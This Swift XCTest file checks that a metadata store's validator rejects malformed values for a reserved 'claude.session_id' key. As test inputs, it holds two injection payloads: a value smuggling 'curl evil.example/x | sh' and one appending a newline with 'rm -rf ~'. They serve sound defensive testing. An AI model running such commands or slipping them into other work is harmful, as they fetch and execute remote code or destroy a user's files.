import XCTest

#if canImport(c11_DEV)
@testable import c11_DEV
#elseif canImport(c11)
@testable import c11
#endif

/// Integration tests for the write-time validator guarding the
/// `claude.session_id` reserved key (CMUX-37 Phase 1 / B1).
///
/// The registry tests in `AgentRestartRegistryTests` cover the resolver's
/// defensive re-validation. These tests cover the other half of the
/// defence: the store must reject malformed writes so a malicious value
/// never lands in the metadata blob in the first place.
///
/// Per `CLAUDE.md`, never run locally — CI only.
final class SurfaceMetadataStoreValidationTests: XCTestCase {

    private let store = SurfaceMetadataStore.shared

    func testStoreAcceptsValidUUIDv4ClaudeSessionId() throws {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        let result = try store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: ["claude.session_id": "abc12345-ef67-890a-bcde-f0123456789a"],
            mode: .merge,
            source: .explicit
        )
        XCTAssertEqual(result.applied["claude.session_id"], true)
    }

    func testStoreRejectsShellInjectionInClaudeSessionId() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        let payload = "fake; curl evil.example/x | sh"
        XCTAssertThrowsError(
            try store.setMetadata(
                workspaceId: workspace,
                surfaceId: surface,
                partial: ["claude.session_id": payload],
                mode: .merge,
                source: .explicit
            )
        ) { error in
            guard let writeError = error as? SurfaceMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(writeError.code, "reserved_key_invalid_type")
        }
    }

    func testStoreRejectsEmbeddedNewlineInClaudeSessionId() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        let payload = "abc12345-ef67-890a-bcde-f0123456789a\nrm -rf ~"
        XCTAssertThrowsError(
            try store.setMetadata(
                workspaceId: workspace,
                surfaceId: surface,
                partial: ["claude.session_id": payload],
                mode: .merge,
                source: .explicit
            )
        ) { error in
            guard let writeError = error as? SurfaceMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(writeError.code, "reserved_key_invalid_type")
        }
    }

    func testStoreRejectsNonStringClaudeSessionId() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        XCTAssertThrowsError(
            try store.setMetadata(
                workspaceId: workspace,
                surfaceId: surface,
                partial: ["claude.session_id": 42],
                mode: .merge,
                source: .explicit
            )
        ) { error in
            guard let writeError = error as? SurfaceMetadataStore.WriteError else {
                return XCTFail("expected WriteError, got \(error)")
            }
            XCTAssertEqual(writeError.code, "reserved_key_invalid_type")
        }
    }

    func testStoreRejectsNonUUIDShapes() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        let shapes = [
            "too-short",
            "aaaaaaaa-1111-2222-3333", // missing last segment
            "aaaaaaaa-1111-2222-3333-444455556666ff", // last segment too long
            "AAAAAAAA_1111_2222_3333_444455556666", // underscores
            "gggggggg-1111-2222-3333-444455556666", // non-hex g
            "",
            " "
        ]
        for shape in shapes {
            XCTAssertThrowsError(
                try store.setMetadata(
                    workspaceId: workspace,
                    surfaceId: surface,
                    partial: ["claude.session_id": shape],
                    mode: .merge,
                    source: .explicit
                ),
                "store must reject '\(shape)'"
            )
        }
    }

    /// Store state must stay empty after rejected writes — the throw is
    /// supposed to happen before mutation per the reserved-key pre-check.
    func testRejectedWriteLeavesStoreUntouched() {
        let workspace = UUID()
        let surface = UUID()
        defer { store.removeSurface(workspaceId: workspace, surfaceId: surface) }

        _ = try? store.setMetadata(
            workspaceId: workspace,
            surfaceId: surface,
            partial: ["claude.session_id": "not a uuid"],
            mode: .merge,
            source: .explicit
        )
        let (metadata, sources) = store.getMetadata(workspaceId: workspace, surfaceId: surface)
        XCTAssertNil(metadata["claude.session_id"])
        XCTAssertNil(sources["claude.session_id"])
    }
}
